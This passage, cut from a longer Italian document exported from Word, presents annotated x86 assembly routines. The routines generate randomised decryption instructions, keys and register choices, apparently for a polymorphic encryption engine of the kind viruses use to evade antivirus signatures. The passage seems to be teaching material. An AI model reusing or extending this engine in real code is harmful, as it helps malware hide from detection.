color:#CCFFCC'>; quando il controllo arriva qui SI = 2<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>do_setkey:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>call<span style="mso-spacerun: yes">    </span>sorta_random<span
style="mso-spacerun: yes">            </span>; AX 0 - 7<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>ror<span style="mso-spacerun: yes">     </span>al,1<span
style="mso-spacerun: yes">                    </span>; divide AL/2<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>jc<span style="mso-spacerun: yes">      </span>do_with_key<span
style="mso-spacerun: yes">             </span>; chiave variabile. </span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>Init<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>byte ptr ds:[si],0b0h<span
style="mso-spacerun: yes">   </span>; marker chiave fissa<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>ret<span
style="mso-spacerun: yes">                             </span>; quindi niente
init chiave<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>do_with_key:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>call<span style="mso-spacerun: yes">   
</span>sorta_random_07<span style="mso-spacerun: yes">         </span>; Scegli
registro come al<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>cmp<span
style="mso-spacerun: yes">     </span>al,04<span style="mso-spacerun:
yes">                   </span>; solito (vedi sopra)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>je<span style="mso-spacerun: yes">   </span><span style="mso-spacerun:
yes">   </span>do_setkey<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>or<span style="mso-spacerun: yes">      </span>al,al<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>jz<span style="mso-spacerun: yes">      </span>do_with_key<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>cmp<span style="mso-spacerun: yes">     </span>al,byte ptr ds:[bx]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>je<span style="mso-spacerun: yes">      </span>do_setkey<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>cmp<span style="mso-spacerun: yes">     </span>al,byte ptr ds:[bx+1]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>je<span style="mso-spacerun: yes">      </span>do_setkey<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>mov<span style="mso-spacerun: yes">     </span>byte ptr
ds:[bx+2],al<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>add<span
style="mso-spacerun: yes">     </span>al,0b8h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>stosb<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>call<span style="mso-spacerun: yes">    </span>sorta_random<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>stosw<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>mov<span style="mso-spacerun: yes">     </span>word ptr
ds:[bx-6],ax<span style="mso-spacerun: yes">   </span>; salva AX in initial_key
<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; do_mathop crea l'istruzione matematica per la decrittazione e
prepara la<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; relativa istruzione per la crittazione nell'encryption loop<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; quando il controllo arriva qui SI = 3<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; la routine costruisce un'istruzione del tipo: <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;<span style="mso-spacerun: yes">           
</span>crittazione<span style="mso-spacerun: yes">          
</span>decrittazione<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;<span style="mso-spacerun: yes">        </span>ADD [reg], </span></b><b><span
lang=DE style='mso-fareast-font-family:"MS Mincho";color:#CCFFCC;mso-ansi-language:
DE'>imm16</span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'><span style="mso-spacerun: yes">  </span><span
style="mso-spacerun: yes">       </span>SUB [reg], imm16 oppure<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC;mso-ansi-language:DE'>;<span style="mso-spacerun: yes">       
</span>XOR [reg], imm16<span style="mso-spacerun: yes">         </span>XOR
[reg], imm16 oppure<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=DE style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC;mso-ansi-language:DE'>;<span style="mso-spacerun: yes">       
</span>SUB [reg], imm16<span style="mso-spacerun: yes">         </span>ADD
[reg], imm16 oppure<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; con imm16 = chiave (numero casuale) e memorizza i vari bytes <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; con :<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; 1° stosb -&gt; inserisce in buffer byte opcode di ADD/SUB/XOR<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; 2° stosb -&gt; inserisce in buffer byte ModR/M con registro<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; 3° stosw -&gt; inserisce in buffer 2 bytes chiave di
decrittazione.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>do_mathop:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>push<span style="mso-spacerun: yes">    </span>cx<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span></span></b><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:FR'>inc<span style="mso-spacerun: yes">    
</span>byte ptr ds:[si]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>resel_mate:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>call<span
style="mso-spacerun: yes">    </span>sorta_random_07<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>cmp<span
style="mso-spacerun: yes">     </span>al,02<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>ja<span
style="mso-spacerun: yes">      </span>resel_mate<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; per forzare l'uso di CS: (quindi decrittare con il pointer in
base al<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; segmento CS e non DS) basta aggiungere:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;<span style="mso-spacerun: yes">      </span>mov<span
style="mso-spacerun: yes">    </span>al,02eh<span style="mso-spacerun:
yes">                  </span>; prefisso CS:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;<span style="mso-spacerun: yes">      </span>stosb<span
style="mso-spacerun: yes">                           </span>; mettilo al suo
posto <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>shl<span style="mso-spacerun: yes">     </span>ax,1<span
style="mso-spacerun: yes">                    </span>; AX = 0/2/4<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>bx,offset mathadds<span
style="mso-spacerun: yes">      </span>; tabella con numeri per crittazione<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>add<span style="mso-spacerun: yes">     </span>bx,ax<span
style="mso-spacerun: yes">                   </span>; BX =
[mathadds]+0-&gt;ADD, +2-&gt;XOR, +4-&gt;SUB<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; nell’istruzione seguente in DX operazione di crittazione e
relativa inversa:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC;mso-ansi-language:EN-US'>; DX = ADD SUB / XOR XOR / SUB ADD (2
bytes a coppia)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC;mso-ansi-language:EN-US'>;<span style="mso-spacerun: yes">     
</span>01h 29h<span style="mso-spacerun: yes">   </span>31h 31h<span
style="mso-spacerun: yes">   </span>29h 01h <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>dx,word ptr ds:[bx]<span
style="mso-spacerun: yes">     </span>; ora in DX crittazione e inversa<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>cmp<span style="mso-spacerun: yes">     </span>byte ptr
ds:[already_key],0b0h<span style="mso-spacerun: yes">  </span>; marker di
chiave fissa<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>jne<span style="mso-spacerun: yes">     </span>so_use_key<span
style="mso-spacerun: yes">              </span>; no chiave fissa ?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; poniamo che ci sia la chiave fissa. Lo stosb che segue scrive
nel buffer<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; l'opcode 81h, che è l'opcode comune per ADD, XOR o SUB.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>al,081h<span style="mso-spacerun:
yes">                 </span>; crea decrittazione con chiave fissa<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>stosb<span
style="mso-spacerun: yes">                           </span>; in [DI] opcode di
ADD/XOR/SUB (byte)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; in DX opcode di ADD SUB / XOR XOR / SUB ADD (2 bytes)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;<span style="mso-spacerun: yes">                 </span>01h
29h<span style="mso-spacerun: yes">   </span>31h 31h<span style="mso-spacerun:
yes">   </span>29h 01h <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; ora aggiunge 3 all’opcode ADD/SUB/XOR + 3. <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>add<span
style="mso-spacerun: yes">     </span>dx,0003h<span style="mso-spacerun:
yes">                </span>; questo 3 è necessario per la codifica<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>al,dl<span style="mso-spacerun:
yes">               </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>jmp<span
style="mso-spacerun: yes">     </span>register_corr<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; con chiave fissa questo blocco viene saltato<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>so_use_key:<span style="mso-spacerun:
yes">              </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>al,dl<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>stosb<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>mov<span style="mso-spacerun: yes">     </span>al,byte ptr
ds:[already_key]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>dec<span
style="mso-spacerun: yes">     </span>al<span style="mso-spacerun:
yes">                      </span>; registro di destinazione<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>cl,3<span style="mso-spacerun:
yes">                 </span><span style="mso-spacerun: yes">   </span>;
moltiplica per 8<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>shl<span
style="mso-spacerun: yes">     </span>al,cl<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>add<span
style="mso-spacerun: yes">     </span>al,0ch<span style="mso-spacerun:
yes">                  </span>; aggiungi base per si,cx<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; è ora di scegliere ilregistro !<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes"> </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>register_corr:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>mov<span style="mso-spacerun: yes">     </span>ah,byte ptr
ds:[already_pnt] <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>cmp<span
style="mso-spacerun: yes">     </span>ah,06<span style="mso-spacerun:
yes">                   </span>; usato SI. AL = 100<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>jz<span style="mso-spacerun: yes">      </span>store_it<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>inc<span style="mso-spacerun: yes">     </span>al<span
style="mso-spacerun: yes">                      </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>cmp<span
style="mso-spacerun: yes">     </span>ah,07h<span style="mso-spacerun:
yes">                  </span>; usato DI. AL = 101<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>je<span
style="mso-spacerun: yes">      </span>store_it<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>inc<span
style="mso-spacerun: yes">     </span>al<span style="mso-spacerun:
yes">                      </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>inc<span
style="mso-spacerun: yes">     </span>al<span style="mso-spacerun:
yes">                      </span>; usato BX. AL = 111<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>store_it:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>stosb<span
style="mso-spacerun: yes">                           </span>; memorizza il
registro<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>cmp<span style="mso-spacerun: yes">     </span>byte ptr
ds:[already_key],0b0h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>jne<span
style="mso-spacerun: yes">     </span>so_nothingelse<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>call<span
style="mso-spacerun: yes">    </span>sorta_random<span style="mso-spacerun:
yes">            </span>; se a chiave fissa metti<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; e con questo stosw inserisce nel buffer la chiave di
decrittazione, o quella iniziale<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; in caso la chiave non sia fissa.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>stosw<span
style="mso-spacerun: yes">                           </span>; anche la chiave
fissa<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>mov<span style="mso-spacerun: yes">     </span>word ptr
ds:[initial_key],ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
